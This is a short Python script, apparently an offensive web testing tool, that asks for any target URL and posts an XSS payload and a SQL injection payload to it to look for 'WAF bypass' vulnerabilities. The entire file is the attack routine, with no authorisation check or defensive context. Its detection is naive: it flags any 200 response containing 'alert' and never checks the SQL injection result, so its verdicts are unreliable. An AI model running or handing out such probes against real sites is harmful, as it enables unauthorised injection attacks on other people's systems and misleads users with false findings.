#!/usr/bin/env python3
import requests

def waf_bypass_tester(target_url):
    """[Test for WAF bypass techniques]"""
    payloads = ["<script>alert('WAF Bypass');</script>", "' OR '1'='1' --"]
    for payload in payloads:
        try:
            response = requests.post(target_url, data={'input': payload})
            if response.status_code == 200 and "alert" in response.text.lower():
                print(f"Potential WAF bypass vulnerability at: {target_url}")
            else:
                print(f"No vulnerability found at: {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error accessing {target_url}: {e}")

# User input
target_url = input("\033[91mint4 [Enter the Target URL for WAF Bypass Testing] > \033[0m")
if target_url.startswith("http://") or target_url.startswith("https://"):
    waf_bypass_tester(target_url)
else:
    print("Please enter a valid URL starting with http:// or https://")